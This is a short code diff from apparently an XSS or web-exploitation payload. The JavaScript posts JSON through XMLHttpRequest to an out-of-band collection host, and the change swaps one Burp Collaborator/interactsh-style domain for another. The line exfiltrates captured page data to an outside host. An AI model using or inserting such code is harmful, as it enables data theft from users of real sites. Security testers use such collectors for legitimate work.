@@ -30,7 +30,7 @@ xhr.onload = function() {
         var webhookXhr = new XMLHttpRequest();
 
         // Prepare the request to the webhook
-        webhookXhr.open('POST', 'https://c1ewse1j2flcnnc55rxx5bzfs6yxmtai.oastify.com', true);
+        webhookXhr.open('POST', 'https://qltxyxqadspfcfpdvhmu0lc79wp6tcydt.oast.fun', true);
         webhookXhr.setRequestHeader('Content-type', 'application/json');
 
         // Define what happens on successful data sending
